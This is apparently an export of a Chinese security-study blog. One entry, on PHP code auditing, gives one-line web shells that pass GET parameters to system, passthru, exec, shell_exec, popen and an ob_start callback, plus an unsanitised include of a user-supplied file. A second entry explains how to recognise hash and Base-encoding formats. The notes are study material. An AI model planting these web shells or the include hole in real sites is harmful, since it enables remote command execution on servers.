<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"><span class="variable">$foobar</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;b&#x27;</span>];</span><br><span class="line"><span class="title function_ invoke__">ob_start</span>(<span class="variable">$foobar</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$_GET</span>[<span class="string">&#x27;h&#x27;</span>];</span><br><span class="line"><span class="title function_ invoke__">ob_end_flush</span>(); </span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br><span class="line">/test.php?h=whoami&amp;b=system</span><br></pre></td></tr></table></figure>

<h2 id="三、常见php可执行系统命令的函数："><a href="#三、常见php可执行系统命令的函数：" class="headerlink" title="三、常见php可执行系统命令的函数："></a>三、常见php可执行系统命令的函数：</h2><h3 id="1-system"><a href="#1-system" class="headerlink" title="1) system()"></a>1) system()</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> <span class="title function_ invoke__">system</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;a&#x27;</span>]); <span class="comment">//xxx.php?a=whoami ?&gt;</span></span><br></pre></td></tr></table></figure>

<h3 id="2-passthru"><a href="#2-passthru" class="headerlink" title="2) passthru()"></a>2) passthru()</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> <span class="title function_ invoke__">passthru</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;a&#x27;</span>]); <span class="comment">//xxx.php?a=whoami ?&gt;</span></span><br></pre></td></tr></table></figure>

<h3 id="3-exec"><a href="#3-exec" class="headerlink" title="3) exec()"></a>3) exec()</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"><span class="variable">$output</span> = <span class="title function_ invoke__">exec</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;a&#x27;</span>]);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;pre&gt;<span class="subst">$output</span>&lt;/pre&gt;&quot;</span>;</span><br><span class="line"><span class="comment">//xxx.php?a=whoami </span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<h3 id="4-shell-exec"><a href="#4-shell-exec" class="headerlink" title="4) shell_exec()"></a>4) shell_exec()</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$output</span> = <span class="title function_ invoke__">shell_exec</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;a&#x27;</span>]);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;pre&gt;<span class="subst">$output</span>&lt;/pre&gt;&quot;</span>;</span><br><span class="line"><span class="comment">//xxx.php?a=whoami </span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<h3 id="5-pcntl-exec"><a href="#5-pcntl-exec" class="headerlink" title="5) pcntl_exec()"></a>5) pcntl_exec()</h3><p>要求：linux系统特有模块，需编译选项中存在—enable-pcntl</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> <span class="title function_ invoke__">pcntl_exec</span>( <span class="string">&quot;/bin/bash&quot;</span> , <span class="keyword">array</span>(<span class="string">&quot;whoami&quot;</span>)); <span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<h3 id="6-popen"><a href="#6-popen" class="headerlink" title="6) popen()"></a>6) popen()</h3><p>popen — 打开进程文件指针。打开一个指向进程的管道，该进程由派生给定的 command 命令执行而产生</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">popen — 打开进程文件指针。打开一个指向进程的管道，该进程由派生给定的 command 命令执行而产生</span><br><span class="line">    </span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$test</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;h&#x27;</span>];</span><br><span class="line"><span class="variable">$fp</span> = <span class="title function_ invoke__">popen</span>(<span class="variable">$test</span>,<span class="string">&quot;r&quot;</span>);  <span class="comment">//popen打一个进程通道</span></span><br><span class="line"><span class="keyword">while</span> (!<span class="title function_ invoke__">feof</span>(<span class="variable">$fp</span>)) &#123;      <span class="comment">//从通道取出内容</span></span><br><span class="line"><span class="variable">$out</span> = <span class="title function_ invoke__">fgets</span>(<span class="variable">$fp</span>, <span class="number">4096</span>);</span><br><span class="line"><span class="keyword">echo</span>  <span class="variable">$out</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="title function_ invoke__">pclose</span>(<span class="variable">$fp</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h3 id="7-proc-open"><a href="#7-proc-open" class="headerlink" title="7) proc_open()"></a>7) proc_open()</h3><p>类似 popen() 函数， 但是 proc_open() 提供了更加强大的控制程序执行的能力</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">类似 <span class="title function_ invoke__">popen</span>() 函数， 但是 <span class="title function_ invoke__">proc_open</span>() 提供了更加强大的控制程序执行的能力</span><br><span class="line">    </span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$test</span> = <span class="string">&quot;whoami&quot;</span>;</span><br><span class="line"><span class="variable">$array</span> =   <span class="keyword">array</span>(</span><br><span class="line"><span class="keyword">array</span>(<span class="string">&quot;pipe&quot;</span>,<span class="string">&quot;r&quot;</span>),   <span class="comment">//标准输入</span></span><br><span class="line"><span class="keyword">array</span>(<span class="string">&quot;pipe&quot;</span>,<span class="string">&quot;w&quot;</span>),   <span class="comment">//标准输出内容</span></span><br><span class="line"><span class="keyword">array</span>(<span class="string">&quot;pipe&quot;</span>,<span class="string">&quot;w&quot;</span>)    <span class="comment">//标准输出错误</span></span><br><span class="line">);</span><br><span class="line"><span class="variable">$fp</span> = <span class="title function_ invoke__">proc_open</span>(<span class="variable">$test</span>,<span class="variable">$array</span>,<span class="variable">$pipes</span>);   <span class="comment">//打开一个进程通道</span></span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">stream_get_contents</span>(<span class="variable">$pipes</span>[<span class="number">1</span>]);    <span class="comment">//为什么是$pipes[1]，因为1是输出内容</span></span><br><span class="line"><span class="title function_ invoke__">proc_close</span>(<span class="variable">$fp</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h3 id="8-反单引号"><a href="#8-反单引号" class="headerlink" title="8) 反单引号"></a>8) 反单引号</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> <span class="keyword">echo</span> `whoami`; <span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<h2 id="四、文件包含"><a href="#四、文件包含" class="headerlink" title="四、文件包含"></a>四、文件包含</h2><p>include将会包含语句并执行指定文件 PHP的配置文件allowurlfopen和allow_url_include设置为ON  include&#x2F;require等包含函数可以加载远程文件 include include_once requeire require_once  </p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(__FILE);</span><br><span class="line"><span class="variable">$file</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>];</span><br><span class="line"><span class="keyword">include</span> <span class="variable">$file</span>; </span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<h2 id="五、php伪协议【web-study已记】"><a href="#五、php伪协议【web-study已记】" class="headerlink" title="五、php伪协议【web-study已记】"></a>五、<a href="../../../../Web-study">php伪协议【web-study已记】</a></h2><h2 id="六、文件操作类威胁函数"><a href="#六、文件操作类威胁函数" class="headerlink" title="六、文件操作类威胁函数"></a>六、文件操作类威胁函数</h2><figure class="highlight scss"><table><tr><td class="code"><pre><span class="line"><span class="number">1</span><span class="selector-class">.file_put_contents</span></span><br><span class="line"></span><br><span class="line"><span class="number">2</span><span class="selector-class">.file_put_contents</span>($file, $string);</span><br><span class="line"></span><br><span class="line"><span class="number">3</span><span class="selector-class">.copy</span> <span class="built_in">highlight_file</span>()</span><br><span class="line"></span><br><span class="line"><span class="number">4</span><span class="selector-class">.fopen</span>()</span><br><span class="line"></span><br><span class="line"><span class="number">5</span><span class="selector-class">.read</span> <span class="built_in">file</span>()</span><br><span class="line"></span><br><span class="line"><span class="number">6</span><span class="selector-class">.fread</span>()</span><br><span class="line"></span><br><span class="line"><span class="number">7</span><span class="selector-class">.fgetss</span>()</span><br><span class="line"></span><br><span class="line"><span class="number">8</span><span class="selector-class">.fgets</span>()</span><br><span class="line"></span><br><span class="line"><span class="number">9</span><span class="selector-class">.parse_ini_file</span>()</span><br><span class="line"></span><br><span class="line"><span class="number">10</span><span class="selector-class">.show_source</span>()</span><br><span class="line"></span><br><span class="line"><span class="number">11</span><span class="selector-class">.file</span>()</span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>网络安全学习</category>
      </categories>
      <tags>
        <tag>代码审计</tag>
      </tags>
  </entry>
  <entry>
    <title>加密密文特征</title>
    <url>/2022/07/21/%E5%8A%A0%E5%AF%86%E7%BC%96%E7%A0%81%E7%B1%BB%E5%9E%8B/</url>
    <content><![CDATA[<p><a href="https://blog.51cto.com/u_15274949/2931589">原文链接</a></p>
<span id="more"></span>

<h2 id="1、MD5——示例"><a href="#1、MD5——示例" class="headerlink" title="1、MD5——示例"></a>1、MD5——示例</h2><p><u><strong>21232F297A57A5A743894A0E4A801FC3</strong></u></p>
<p>一般MD5值是<u>32位</u>由数字<code>0-9</code>和字母<code>a-f</code>所组成的字符串，如图。<u>如果出现这个范围以外的字符说明这可能是个错误的md5值</u>，就没必要再拿去解密了。16位值是取的是8~24位。</p>
<p><img src="/2022/07/21/%E5%8A%A0%E5%AF%86%E7%BC%96%E7%A0%81%E7%B1%BB%E5%9E%8B/image-20220721175149372.png" alt="image-20220721175149372"></p>
<p>md5的三个特征：</p>
<p>1.<strong>确定性</strong>：一个原始数据的MD5值是唯一的，同一个原始数据不可能会计算出多个不同的MD5值。</p>
<p>2.<strong>碰撞性</strong>：<u>原始数据与其MD5值并不是一一对应的</u>，有可能多个原始数据计算出来的MD5值是一样的，这就是碰撞。</p>
<p>3.<strong>不可逆</strong>：也就是说如果告诉你一个MD5值，你是无法通过它还原出它的原始数据的，这不是你的技术不够牛，这是由它的算法所决定的。因为根据第2点，<u>一个给定的MD5值是可能对应多个原始数据的</u>，并且理论上讲是可以对应无限多个原始数据，所有无法确定到底是由哪个原始数据产生的。</p>
<h2 id="2、sha1——示例"><a href="#2、sha1——示例" class="headerlink" title="2、sha1——示例"></a>2、sha1——示例</h2><p><u><strong>d033e22ae348aeb5660fc2140aec35850c4da997</strong></u></p>
<p>这种加密的密文特征跟MD5差不多，只不过<u>位数是40</u></p>
<p><img src="/2022/07/21/%E5%8A%A0%E5%AF%86%E7%BC%96%E7%A0%81%E7%B1%BB%E5%9E%8B/image-20220721175316568.png" alt="image-20220721175316568"></p>
<h2 id="3、HMAC算法——示例"><a href="#3、HMAC算法——示例" class="headerlink" title="3、HMAC算法——示例"></a>3、HMAC算法——示例</h2><p><u><strong>5b696ae7da9442ead7adc24d03cedb65</strong></u></p>
<p>HMAC (Hash-based Message Authentication Code) 常用于接口签名验证，这种算法就是在前两种加密的基础上引入了秘钥，而秘钥又只有传输双方才知道，所以基本上是破解不了的</p>
<p><img src="/2022/07/21/%E5%8A%A0%E5%AF%86%E7%BC%96%E7%A0%81%E7%B1%BB%E5%9E%8B/image-20220721175340163.png" alt="image-20220721175340163"></p>
<h2 id="4、NTLM——示例"><a href="#4、NTLM——示例" class="headerlink" title="4、NTLM——示例"></a>4、NTLM——示例</h2><p><u><strong>209c6174da490caeb422f3fa5a7ae634</strong></u></p>
<p>这种加密是Windows的哈希密码，是 Windows NT 早期版本的标准安全协议。与它相同的还有Domain Cached Credentials（域哈希）。</p>
<p><img src="/2022/07/21/%E5%8A%A0%E5%AF%86%E7%BC%96%E7%A0%81%E7%B1%BB%E5%9E%8B/image-20220721175431939.png" alt="image-20220721175431939"></p>
<h2 id="相似加密类型"><a href="#相似加密类型" class="headerlink" title="相似加密类型"></a>相似加密类型</h2><figure class="highlight apache"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line"><span class="comment">#    算法       长度</span></span><br><span class="line"></span><br><span class="line"><span class="attribute">1</span> 	md5 	 <span class="number">32</span>/<span class="number">16</span></span><br><span class="line"><span class="attribute">2</span> 	sha1 	    <span class="number">40</span></span><br><span class="line"><span class="attribute">3</span> 	sha256 	    <span class="number">64</span></span><br><span class="line"><span class="attribute">4</span> 	sha512 	   <span class="number">128</span></span><br><span class="line"><span class="attribute">5</span> 	adler32 	 <span class="number">8</span></span><br><span class="line"><span class="attribute">6</span> 	crc32 	     <span class="number">8</span></span><br><span class="line"><span class="attribute">7</span> 	crc32b       <span class="number">8</span></span><br><span class="line"><span class="attribute">8</span> 	fnv132 	     <span class="number">8</span></span><br><span class="line"><span class="attribute">9</span> 	fnv164 	    <span class="number">16</span></span><br><span class="line"><span class="attribute">10</span> 	fnv1a32 	 <span class="number">8</span></span><br><span class="line"><span class="attribute">11</span> 	fnv1a64     <span class="number">16</span></span><br><span class="line"><span class="attribute">12</span> 	gost 	    <span class="number">64</span></span><br><span class="line"><span class="attribute">13</span> 	gost-crypto <span class="number">64</span></span><br><span class="line"><span class="attribute">14</span> 	haval128,<span class="number">3</span> 	<span class="number">32</span></span><br><span class="line"><span class="attribute">15</span> 	haval128,<span class="number">4</span> 	<span class="number">32</span></span><br><span class="line"><span class="attribute">16</span> 	haval128,<span class="number">5</span> 	<span class="number">32</span></span><br><span class="line"><span class="attribute">17</span> 	haval160,<span class="number">3</span> 	<span class="number">40</span></span><br><span class="line"><span class="attribute">18</span> 	haval160,<span class="number">4</span> 	<span class="number">40</span></span><br><span class="line"><span class="attribute">19</span> 	haval160,<span class="number">5</span> 	<span class="number">40</span></span><br><span class="line"><span class="attribute">20</span> 	haval192,<span class="number">3</span> 	<span class="number">48</span></span><br><span class="line"><span class="attribute">21</span> 	haval192,<span class="number">4</span> 	<span class="number">48</span></span><br><span class="line"><span class="attribute">22</span> 	haval192,<span class="number">5</span> 	<span class="number">48</span></span><br><span class="line"><span class="attribute">23</span> 	haval224,<span class="number">3</span> 	<span class="number">56</span></span><br><span class="line"><span class="attribute">24</span> 	haval224,<span class="number">4</span> 	<span class="number">56</span></span><br><span class="line"><span class="attribute">25</span> 	haval224,<span class="number">5</span> 	<span class="number">56</span></span><br><span class="line"><span class="attribute">26</span> 	haval256,<span class="number">3</span> 	<span class="number">64</span></span><br><span class="line"><span class="attribute">27</span> 	haval256,<span class="number">4</span> 	<span class="number">64</span></span><br><span class="line"><span class="attribute">28</span> 	haval256,<span class="number">5</span> 	<span class="number">64</span></span><br><span class="line"><span class="attribute">29</span> 	joaat 	     <span class="number">8</span></span><br><span class="line"><span class="attribute">30</span> 	md2          <span class="number">32</span></span><br><span class="line"><span class="attribute">31</span> 	md4 	     <span class="number">32</span></span><br><span class="line"><span class="attribute">32</span> 	ripemd128 	 <span class="number">32</span></span><br><span class="line"><span class="attribute">33</span> 	ripemd160 	 <span class="number">40</span></span><br><span class="line"><span class="attribute">34</span> 	ripemd256 	 <span class="number">64</span></span><br><span class="line"><span class="attribute">35</span> 	ripemd320 	 <span class="number">80</span></span><br><span class="line"><span class="attribute">36</span> 	sha224 	     <span class="number">56</span></span><br><span class="line"><span class="attribute">37</span> 	sha3-<span class="number">224</span> 	 <span class="number">56</span></span><br><span class="line"><span class="attribute">38</span> 	sha3-<span class="number">256</span> 	 <span class="number">64</span></span><br><span class="line"><span class="attribute">39</span> 	sha3-<span class="number">384</span> 	 <span class="number">96</span></span><br><span class="line"><span class="attribute">40</span> 	sha3-<span class="number">512</span> 	 <span class="number">128</span></span><br><span class="line"><span class="attribute">41</span> 	sha384       <span class="number">96</span></span><br><span class="line"><span class="attribute">42</span> 	sha512/<span class="number">224</span>   <span class="number">56</span></span><br><span class="line"><span class="attribute">43</span> 	sha512/<span class="number">256</span> 	 <span class="number">64</span></span><br><span class="line"><span class="attribute">44</span> 	snefru       <span class="number">64</span></span><br><span class="line"><span class="attribute">45</span> 	snefru256    <span class="number">64</span></span><br><span class="line"><span class="attribute">46</span> 	tiger128,<span class="number">3</span> 	 <span class="number">32</span></span><br><span class="line"><span class="attribute">47</span> 	tiger128,<span class="number">4</span> 	 <span class="number">32</span></span><br><span class="line"><span class="attribute">48</span> 	tiger160,<span class="number">3</span>   <span class="number">40</span></span><br><span class="line"><span class="attribute">49</span> 	tiger160,<span class="number">4</span>   <span class="number">40</span></span><br><span class="line"><span class="attribute">50</span> 	tiger192,<span class="number">3</span> 	 <span class="number">48</span></span><br><span class="line"><span class="attribute">51</span> 	tiger192,<span class="number">4</span>   <span class="number">48</span></span><br><span class="line"><span class="attribute">52</span> 	whirlpool 	 <span class="number">128</span></span><br><span class="line"><span class="attribute">53</span> 	mysql 	     老MYSQL数据库用的，<span class="number">16</span>位，且第<span class="number">1</span>位和第<span class="number">7</span>位必须为<span class="number">0</span>-<span class="number">8</span></span><br><span class="line"><span class="attribute">54</span> 	mysql5 	     <span class="number">40</span></span><br><span class="line"><span class="attribute">55</span> 	NTLM 	     <span class="number">32</span></span><br><span class="line"><span class="attribute">56</span> 	Domain Cached Credentials 	<span class="number">32</span></span><br></pre></td></tr></table></figure>

<h2 id="常用解密网站："><a href="#常用解密网站：" class="headerlink" title="常用解密网站："></a>常用解密网站：</h2><p><code>www.cmd5.com（带批量解密工具）</code></p>
<p><code>www.somd5.com</code></p>
<p><code>cmd5.la</code></p>
<p><code>pmd5.com</code></p>
<p><code>www.ttmd5.com（带批量解密工具）</code></p>
<hr>
<p><u>Base64、Base58、Base32、Base16、Base85、Base100等相似加密类型</u></p>
<h2 id="1、Base64——示例"><a href="#1、Base64——示例" class="headerlink" title="1、Base64——示例"></a>1、Base64——示例</h2><p><u><strong>YWRtaW4tcm9vdA&#x3D;&#x3D;</strong></u></p>
<p>一般情况下密文尾部都会有两个等号，明文很少的时候则没有</p>
<p>Base64编码要求把3个8位字节（38&#x3D;24）转化为4个6位的字节（46&#x3D;24），之后在6位的前面补两个0，形成8位一个字节的形式。如果剩下的字符不足3个字节，则用0填充，输出字符使用‘&#x3D;’，因此编码后输出的文本末尾可能会出现1或2个‘&#x3D;’，如图。</p>
<p><img src="/2022/07/21/%E5%8A%A0%E5%AF%86%E7%BC%96%E7%A0%81%E7%B1%BB%E5%9E%8B/image-20220721180138424.png" alt="image-20220721180138424"></p>
<p>为了保证所输出的编码位可读字符，Base64制定了一个编码表，以便进行统一转换。编码表的大小为2^6&#x3D;64，这也是Base64名称的由来。</p>
<p><img src="/2022/07/21/%E5%8A%A0%E5%AF%86%E7%BC%96%E7%A0%81%E7%B1%BB%E5%9E%8B/image-20220721180249541.png" alt="image-20220721180249541"></p>
<h3 id="Base64使用注意问题"><a href="#Base64使用注意问题" class="headerlink" title="Base64使用注意问题"></a>Base64使用注意问题</h3><h4 id="一、Base64和URL传参问题"><a href="#一、Base64和URL传参问题" class="headerlink" title="一、Base64和URL传参问题"></a>一、Base64和URL传参问题</h4><p>标准的Base64并不适合直接放在URL里传输，因为URL编码器会把标准Base64中的“&#x2F;”和“+”字符变为形如“%XX”的形式，而这些“%”号在存入数据库时还需要再进行转换，因为ANSI SQL中已将“%”号用作通配符。</p>
<p>为解决此问题，可采用一种用于URL的改进Base64编码，它在末尾填充’&#x3D;’号，并将标准Base64中的“+”和“&#x2F;”分别改成了“-”和“_”，这样就免去了在URL编解码和数据库存储时所要作的转换，避免了编码信息长度在此过程中的增加，并统一了数据库、表单等处对象标识符的格式。</p>
<h4 id="二、Base64和URL传参问题改善"><a href="#二、Base64和URL传参问题改善" class="headerlink" title="二、Base64和URL传参问题改善"></a>二、Base64和URL传参问题改善</h4><p>另有一种用于正则表达式的改进Base64变种，它将“+”和“&#x2F;”改成了“!”和“-”，因为“+”,“*”以及前面在IRCu中用到的“[”和“]”在正则表达式中都可能具有特殊含义。</p>
<p>此外还有一些变种，它们将“+&#x2F;”改为“-”或“.”（用作编程语言中的标识符名称）或“.-”（用于XML中的Nmtoken）甚至“_:”（用于XML中的Name）。</p>
<h4 id="三、Base64转换后比原有的字符串长1-x2F-3"><a href="#三、Base64转换后比原有的字符串长1-x2F-3" class="headerlink" title="三、Base64转换后比原有的字符串长1&#x2F;3"></a>三、Base64转换后比原有的字符串长1&#x2F;3</h4><p>Base64要求把每三个8Bit的字节转换为四个6Bit的字节（38 &#x3D; 46 &#x3D; 24），然后把6Bit再添两位高位0，组成四个8Bit的字节，也就是说，转换后的字符串理论上将要比原来的长1&#x2F;3。<br>四、Base64转换总结</p>
<p>Base64转换，最好是不要用在加密上，尤其是参数加密，很容易出问题。</p>
<h2 id="2、Base58——示例"><a href="#2、Base58——示例" class="headerlink" title="2、Base58——示例"></a>2、Base58——示例</h2><p><u><strong>6tmHCZvhgfNjQu</strong></u></p>
<p>它最大的特点是没有等号</p>
<p>Base58是用于比特币（Bitcoin）中使用的一种独特的编码方式，主要用于产生Bitcoin的钱包地址。</p>
<p>相比Base64，Base58不使用数字”0”，字母大写”O”，字母大写”I”，和字母小写”l”，以及”+“和”&#x2F;“符号。</p>
<p>比特币的Base58字母表：</p>
<p>123456789ABCDEFGHJKLMNPQRSTUVWXYZabcdefghijkmnopqrstuvwxyz</p>
<p>简单的说：Base58一种编码方式，跟十进制，十六进制一样，不过更短更省空间。</p>
<p>Base58的原理是什么？</p>
<p>二进制：0和1</p>
<p>十进制：1到10</p>
<p>十六进制：十进制的基础上加上了A-F 六个字母</p>
<p>Base58可以理解为一种58进制。</p>
<p>Base58包含了阿拉伯数字、小写英文字母，大写英文字母。</p>
<p>但是去掉了一些容易混淆的数字和字母：0（数字0）、O（o的大写字母）、l（ L的小写字母）、I（i的大写字母）</p>
<p><img src="/2022/07/21/%E5%8A%A0%E5%AF%86%E7%BC%96%E7%A0%81%E7%B1%BB%E5%9E%8B/image-20220721180316955.png" alt="image-20220721180316955"></p>
<h2 id="3、Base32——示例"><a href="#3、Base32——示例" class="headerlink" title="3、Base32——示例"></a>3、Base32——示例</h2><p><u><strong>GEZDGNBVGY3TQOJQGE&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;</strong></u></p>
<p><u>他的特点是明文超过十个后面就会有很多等号</u></p>
<p>Base32使用了ASCII编码中可打印的<u>32个字符</u>(<strong>大写</strong>字母A-Z和数字2-7)对任意字节数据进行编码.Base32将串起来的二进制数据按照5个二进制位分为一组，由于传输数据的单位是字节(即8个二进制位).所以分割之前的二进制位数是40的倍数(40是5和8的最小公倍数).如果不足40位，则在编码后数据补充”&#x3D;”，一个”&#x3D;”相当于一个组(5个二进制位)，编码后的数据是原先的8&#x2F;5倍.</p>
<p><img src="/2022/07/21/%E5%8A%A0%E5%AF%86%E7%BC%96%E7%A0%81%E7%B1%BB%E5%9E%8B/image-20220721180354078.png" alt="image-20220721180354078"></p>
<p>Base32将任意字符串按照字节进行切分，并将每个字节对应的二进制值（不足8比特高位补0）串联起来，按照5比特一组进行切分，并将每组二进制值转换成十进制来对应32个可打印字符中的一个。</p>
<p><img src="/2022/07/21/%E5%8A%A0%E5%AF%86%E7%BC%96%E7%A0%81%E7%B1%BB%E5%9E%8B/image-20220721180407579.png" alt="image-20220721180407579"></p>
<p>由于数据的二进制传输是按照8比特一组进行（即一个字节），因此Base32按5比特切分的二进制数据必须是40比特的倍数（5和8的最小公倍数）。例如输入单字节字符“%”，它对应的二进制值是“100101”，前面补两个0变成“00100101”（二进制值不足8比特的都要在高位加0直到8比特），从左侧开始按照5比特切分成两组：“00100”和“101”，后一组不足5比特，则在末尾填充0直到5比特，变成“00100”和“10100”，这两组二进制数分别转换成十进制数，通过上述表格即可找到其对应的可打印字符“E”和“U”，但是这里只用到两组共10比特，还差30比特达到40比特，按照5比特一组还需6组，则在末尾填充6个“&#x3D;”。填充“&#x3D;”符号的作用是方便一些程序的标准化运行，大多数情况下不添加也无关紧要，而且，在URL中使用时必须去掉“&#x3D;”符号。</p>
<p><u>与Base64相比，Base32具有许多优点：</u></p>
<p>1.适合不区分大小写的文件系统，更利于人类口语交流或记忆。</p>
<p>2.结果可以用作文件名，因为它不包含路径分隔符 “&#x2F;”等符号。</p>
<p>3.排除了视觉上容易混淆的字符，因此可以准确的人工录入。（例如，RFC4648符号集忽略了数字“1”、“8”和“0”，因为它们可能与字母“I”，“B”和“O”混淆）。</p>
<p>4.排除填充符号“&#x3D;”的结果可以包含在URL中，而不编码任何字符。</p>
<p><u>Base32也比Base16有优势：</u></p>
<p><strong>·</strong>Base32比Base16占用的空间更小。（1000比特数据Base32需要200个字符，而Base16则为250个字符）</p>
<p><u>Base32的缺点：</u></p>
<p><strong>·</strong>Base32比Base64多占用大约20％的空间。因为Base32使用8个ASCII字符去编码原数据中的5个字节数据，而Base64是使用4个ASCII字符去编码原数据中的3个字节数据。</p>
<h2 id="4、Base16——示例"><a href="#4、Base16——示例" class="headerlink" title="4、Base16——示例"></a>4、Base16——示例</h2><p><u><strong>61646D696E</strong></u></p>
<p>它的特点是<u>没有等号</u>并且<u>数字要多于字母</u></p>
<p>Base16编码的方式：</p>
<p>1.将数据(根据ASCII编码，UTF-8编码等)转成对应的二进制数，不足8比特位高位补0。然后将所有的二进制全部串起来，4个二进制位为一组，转化成对应十进制数。</p>
<p>2.根据十进制数值找到Base16编码表里面对应的字符。Base16是4个比特位表示一个字符，所以原始是1个字节(8个比特位)刚好可以分成两组,也就是说原先如果使用ASCII编码后的一个字符，现在转化成两个字符。数据量是原先的2倍。</p>
<p><img src="/2022/07/21/%E5%8A%A0%E5%AF%86%E7%BC%96%E7%A0%81%E7%B1%BB%E5%9E%8B/image-20220721193743306.png" alt="image-20220721193743306"></p>
<p>Base16编码是一个标准的十六进制字符串（注意是字符串而不是数值），更易被人类和计算机使用，因为它并不包含任何控制字符，以及Base64和Base32中的“&#x3D;”符号。</p>
<p><img src="/2022/07/21/%E5%8A%A0%E5%AF%86%E7%BC%96%E7%A0%81%E7%B1%BB%E5%9E%8B/image-20220721193802684.png" alt="image-20220721193802684"></p>
<h2 id="5、Base85——示例"><a href="#5、Base85——示例" class="headerlink" title="5、Base85——示例"></a>5、Base85——示例</h2><p><u><strong>@:X4hDWe0rkE(G[OdP4CT]N#</strong></u></p>
<p>特点是<u>奇怪的字符比较多</u>，但是很难出现等号</p>
<p><img src="/2022/07/21/%E5%8A%A0%E5%AF%86%E7%BC%96%E7%A0%81%E7%B1%BB%E5%9E%8B/image-20220721193845924.png" alt="image-20220721193845924"></p>
<h2 id="6、Base100——示例"><a href="#6、Base100——示例" class="headerlink" title="6、Base100——示例"></a>6、Base100——示例</h2><p><u><strong>????????????????????</strong></u></p>
<p>特点就是一堆Emoji表情</p>
<p>Base100编码&#x2F;解码工具（又名：Emoji表情符号编码&#x2F;解码），可将文本内容编码为Emoji表情符号；同时也可以将编码后的Emoji表情符号内容解码为文本。</p>
<p><img src="/2022/07/21/%E5%8A%A0%E5%AF%86%E7%BC%96%E7%A0%81%E7%B1%BB%E5%9E%8B/image-20220721193925524.png" alt="image-20220721193925524"></p>
<h2 id="常用解密网站：-1"><a href="#常用解密网站：-1" class="headerlink" title="常用解密网站："></a>常用解密网站：</h2><p>Base64：</p>
<p><code>tool.oschina.net</code></p>
<p><code>www.sojson.com</code></p>
<p><code>base64.us</code></p>
<p>Base58：</p>
<p><code>www.metools.info</code></p>
<p>Base32、16：</p>
<p><code>www.qqxiuzi.cn</code></p>
<p>Base100：</p>
<p><code>www.atoolbox.net</code></p>
<hr>
<h2 id="1、Unicode——汉字示例"><a href="#1、Unicode——汉字示例" class="headerlink" title="1、Unicode——汉字示例"></a>1、Unicode——汉字示例</h2><figure class="highlight cal"><table><tr><td class="code"><pre><span class="line">汉字示例&amp;<span class="string">#36825</span>（这）;、字母示例&amp;<span class="string">#116</span>（t）;、数字符号示例&amp;<span class="string">#53</span>（<span class="number">5</span>）;</span><br></pre></td></tr></table></figure>

<p>可以说Unicode与HTML实体编码是一个东西</p>
<p>Unicode（统一码、万国码、单一码）是一种在计算机上使用的字符编码。Unicode 是为了解决传统的字符编码方案的局限而产生的，它为每种语言中的每个字符设定了统一并且唯一的二进制编码，以满足跨语言、跨平台进行文本转换、处理的要求。1990年开始研发，1994年正式公布。</p>
<p><img src="/2022/07/21/%E5%8A%A0%E5%AF%86%E7%BC%96%E7%A0%81%E7%B1%BB%E5%9E%8B/image-20220721194526725.png" alt="image-20220721194526725"></p>
<h2 id="2、HTML实体编码——示例与Unicode相同"><a href="#2、HTML实体编码——示例与Unicode相同" class="headerlink" title="2、HTML实体编码——示例与Unicode相同"></a>2、HTML实体编码——示例与Unicode相同</h2><p>字符实体是用一个编号写入HTML代码中来代替一个字符，在使用浏览器访问网页时会将这个编号解析还原为字符以供阅读。</p>
<p>这么做的目的主要有两个：<br>１、解决HTML代码编写中的一些问题。例如需要在网页上显示小于号（&lt;）和大于号（&gt;），由于它们是HTML的预留标签，可能会被误解析。这时就需要将小于号和大于号写成字符实体：<br>小于号这样写：&lt; 或 &lt;<br>大于号这样写：&gt; 或 &gt;<br>前面的写法称为实体名称，后面的写法则是实体编号。ISO-8859-1字符集（西欧语言）中两百多个字符设定了实体名称，而对于其它所有字符都可以用实体编号来代替。<br>２、网页编码采用了特定语言的编码，却需要显示来自其它语言的字符。例如，网页编码采用了西欧语言ISO-8859-1，却要在网页中显示中文，这时必须将中文字符以实体形式写入HTML代码中。</p>
